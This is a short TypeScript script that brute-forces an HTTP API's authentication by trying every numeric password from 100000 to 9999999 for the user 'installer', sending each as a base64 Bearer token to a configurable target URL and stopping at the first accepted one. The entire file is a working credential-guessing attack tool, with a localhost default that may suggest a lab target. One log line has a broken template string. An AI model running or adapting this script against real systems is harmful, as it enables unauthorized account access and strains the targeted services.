import dotenv from 'dotenv'
dotenv.config({ path: '.env' })

import { envString } from './env'
import log from './log'
import axios from 'axios'
;(async () => {
  const targetUrl = envString('TARGET_URL', 'http://localhost:3030/posts')
  log.info('⚡️ App started for url ${url}')

  for (let i = 100000; i < 9999999; i++) {
    const token = Buffer.from(`installer:${i}`).toString('base64')
    const config = {
      headers: {
        Authorization: `Bearer ${token}`,
        accept: 'application/json'
      }
    }

    try {
      const resp = await axios.get(targetUrl, config)
      log.info(`${resp.status} ${resp.statusText} Auth installer:${i}`)
      break
    } catch (e: Error | unknown) {
      log.info(`${e} Auth installer:${i} ${targetUrl}`)
    }
    await sleep(800)
  }
})()

function sleep(ms: number) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms)
  })
}
